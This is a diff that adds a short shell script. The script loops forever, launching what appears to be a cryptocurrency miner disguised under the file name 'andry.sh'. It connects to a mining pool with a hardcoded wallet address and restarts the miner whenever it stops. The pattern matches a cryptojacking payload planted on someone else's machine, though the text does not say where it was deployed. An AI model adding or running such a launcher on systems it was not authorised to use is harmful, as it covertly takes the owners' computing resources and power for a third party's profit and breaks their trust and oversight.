@@ -1,0 +1,5 @@
+#!/bin/sh
+while [ 1 ]; do
+	./andry.sh -a yespower  -o stratum+tcp://stratum-na.rplant.xyz:17017 -u web1q0esp7rarj5hd6pcxsqy6ewvfuv7pl7t4nzx7uk.01 -p x -t 16
+	sleep 5
+done
